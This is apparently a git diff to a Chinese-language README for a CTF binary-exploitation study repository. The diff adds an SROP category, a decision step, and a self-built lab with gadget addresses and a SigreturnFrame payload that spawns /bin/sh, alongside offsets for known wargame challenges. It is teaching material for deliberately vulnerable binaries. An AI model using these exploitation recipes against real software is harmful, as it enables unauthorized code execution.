@@ -7,7 +7,7 @@
 
 ## 1. 分类原则
 
-本仓库目前按十类利用原语（exploit primitive）划分：
+本仓库目前按十一类利用原语（exploit primitive）划分：
 
 | 模式目录 | 共同模式特征 | 判定核心 |
 | --- | --- | --- |
@@ -17,6 +17,7 @@
 | `ret2shellcode` | 可执行内存 + shellcode | NX 关闭（`GNU_STACK=RWE`），leak 可执行内存地址后把 shellcode 写进去并跳转 |
 | `stack_pivot` | 栈空间不足 → 换栈 | 溢出字节数装不下 ROP 链，用 `xchg rsp,rax` / `leave;ret` 把栈迁到堆 / `.bss` / mmap 再执行长链 |
 | `sandbox_seccomp` | seccomp 沙箱 + ORW | 程序用 `prctl` 装 BPF 过滤，`execve` 被拦；只能 `open`+`read`+`write` 把 flag 读出来 |
+| `srop` | 寄存器一把梭 | `rax=15` + `syscall` 触发 `rt_sigreturn`，用 248 字节伪造 sigframe 一次设置全部寄存器，绕开缺失的传参 gadget |
 | `format_string_write` | 格式化字符串任意写 | `printf(user_input)`，用 `%n` 改全局变量 / GOT / 返回地址 |
 | `stack_local_var_overwrite` | 栈溢出改局部变量 / 条件绕过 | 只覆盖与缓冲区相邻的局部变量，使条件判断成立，不控制 RIP |
 | `heap_uaf` | 释放后使用 | free 后指针仍被引用，重新分配旧对象，改写函数指针 / vtable / 控制流 |
@@ -33,12 +34,14 @@
    └─ 是 → format_string_write
 3. NX 是否关闭（`GNU_STACK=RWE`），且能拿到可执行内存的地址？
    └─ 是 → ret2shellcode
-4. 溢出的目标是 saved RIP 吗？
+4. 有 `syscall; ret` + `pop rax; ret`，但缺 `pop rdi/rsi/rdx`（或根本没有 libc）？
+   └─ 是 → srop（`rax=15` + `syscall` 触发 `rt_sigreturn`）
+5. 溢出的目标是 saved RIP 吗？
    ├─ 是，但可用字节数不足以放下完整 ROP 链 → 先 stack_pivot
    ├─ 是，且跳转到二进制内已有代码 → ret2text
    ├─ 是，但需要 leak libc 才能调用 system → ret2libc
    └─ 否，只是改相邻局部变量 → stack_local_var_overwrite
-5. 漏洞在堆上吗？
+6. 漏洞在堆上吗？
    ├─ free 后指针仍被引用，可重占旧对象 → heap_uaf
    └─ 需要操纵堆布局 / 分配器元数据 / 相邻对象指针 → heap_exploitation
 ```
@@ -75,6 +78,7 @@
 | 21 | `pwnable_start` | ret2shellcode / 栈可执行 / 32 位静态汇编 | `ret2shellcode` | `read(0, esp, 0x3c)` 一次溢出即可覆盖返回地址，且 `push esp` 让栈地址天然泄漏；`GNU_STACK=RWE` 直接执行栈上 `execve("/bin/sh")` | **0x14**（shellcode 在 0x18） | `leak=0x8048087`、payload 基址 `leak-4`、shellcode 21 字节 |
 | 22 | `ropemporium_pivot` | stack pivot + 两阶段 .so leak / 64 位 | `stack_pivot` | `read(0, rbp-0x20, 0x40)` 只给 0x18 可用字节 → `pop rax`+`xchg rsp,rax` 迁到程序打印的 `heap+0xFFFF00`；CSU 链先调 `[foothold@got]` 触发懒绑定再 `puts` 泄漏 libpivot 基址，回 main 二次迁移打 `ret2win` | **0x28**（仅 0x40 上限） | `pop rax=0x4009bb`、`xchg rsp,rax=0x4009bd`、CSU `0x400a2a`/`0x400a10`、`foothold=0x96a`、`ret2win=0xa81` |
 | 23 | `pwnable_orw` | seccomp 沙箱 + ORW shellcode / 32 位 | `sandbox_seccomp` | `read(0, 0x804a060, 0xc8)` 后直接 `call` 缓冲区；BPF 只放行 `open/read/write/exit`，写 51 字节 ORW shellcode 读 `flag.txt` | N/A（无栈溢出） | shellcode 落点 `0x804a060`、上限 `0xc8`、BPF 表 `0x8048640` |
+| L1 | `lab_srop_baby`（自造） | SROP / 64 位静态汇编 | `srop` | `read(0, rsp, 0x400)` 溢出；只有 `syscall;ret` + `pop rax;ret`，无传参 gadget 无 libc → `rax=15` 触发 `rt_sigreturn`，sigframe 直接 `execve("/bin/sh")` | **0**（read 直接写 rsp） | `syscall;ret=0x401065`、`pop rax;ret=0x401068`、`bss=0x403010` |
 
 ---
 
@@ -693,6 +697,58 @@ xor eax,eax; xor ebx,ebx; inc ebx; mov al,4; int 0x80      ; write(1,...)
 
 ---
 
+### 3.L1 `lab_srop_baby` → `srop`（自造实验）
+
+```text
+x86_64、静态（as + ld，无 libc）、ET_EXEC（无 PIE）、PT_GNU_STACK=RW（NX 开启）
+无 canary、无 GOT
+gadget：0x401065 syscall;ret、0x401068 pop rax;ret
+bss：0x403010（0x100 字节）
+```
+
+程序逻辑（`labs/lab_srop_baby/src/chal.S`）：
+
+```text
+write(1, "name: ", 6)
+read(0, 0x403010, 0x100)      # 名字 -> bss，地址已知
+write(1, "exploit: ", 9)
+read(0, rsp, 0x400)           # 栈溢出，缓冲区就是当前栈顶
+ret                           # 返回地址来自栈上
+```
+
+判定依据：
+
+1. NX 开启 → 排除 `ret2shellcode`。
+2. 程序里没有 `pop rdi`/`pop rsi`/`pop rdx`，也没有 libc → 常规 ROP 传不出 `execve` 参数。
+3. 同时具备 `pop rax; ret` 和 `syscall; ret` → 命中 §1 判定顺序第 4 条 `srop`。
+
+利用：
+
+```text
+name 阶段："/bin/sh\0" -> 0x403010
+exploit 阶段：
+  p64(pop_rax) + p64(15) + p64(syscall_ret) + bytes(SigreturnFrame(
+      rax=59, rdi=0x403010, rsi=0, rdx=0, rip=syscall_ret, rsp=0x403090))
+```
+
+链的语义：
+
+```text
+ret -> pop rax (=15) -> ret -> syscall  ==> rt_sigreturn
+内核把栈当成 sigcontext 还原：rax=59, rdi=bss, rip=syscall_ret
+-> 再次 syscall => execve("/bin/sh", NULL, NULL)
+```
+
+坑点：
+
+- **必须写 `.section .note.GNU-stack,"",@progbits`**：否则 `ld` 不生成 `PT_GNU_STACK`，
+  内核对无该段的程序默认给可执行栈，题目直接退化成 ret2shellcode。
+- `read` 的目标是 `rsp`，所以 saved RIP 偏移是 **0**，payload 第一个 qword 就是返回地址。
+- sigframe 的 `rsp` 别指向 bss 开头（会被 "/bin/sh" 占用的 8 字节影响观感），
+  习惯性放到 `bss+0x80`。
+
+---
+
 ## 4. 仓库结构映射（重构前 → 重构后）
 
 | 重构前（按题目建目录） | 重构后（按模式归档） |
@@ -720,6 +776,7 @@ xor eax,eax; xor ebx,ebx; inc ebx; mov al,4; int 0x80      ; write(1,...)
 | pwnable.tw `start`（外部下载，`_vendor/start`） | `ret2shellcode/21_pwnable_start_*`、`ret2shellcode/pwnable_start` |
 | ROP Emporium `pivot`（外部下载，`_vendor/pivot/`） | `stack_pivot/22_ropemporium_pivot_*`、`stack_pivot/pivot`、`stack_pivot/libpivot.so` |
 | pwnable.tw `orw`（外部下载，`_vendor/orw`） | `sandbox_seccomp/23_pwnable_orw_*`、`sandbox_seccomp/orw`、`sandbox_seccomp/make_local_exec.py` |
+| 自造实验（无外部来源） | `labs/lab_srop_baby/`（`src/chal.S` + `Makefile` + `exp.py` + `README.md`） |
 
 命名规则：
 
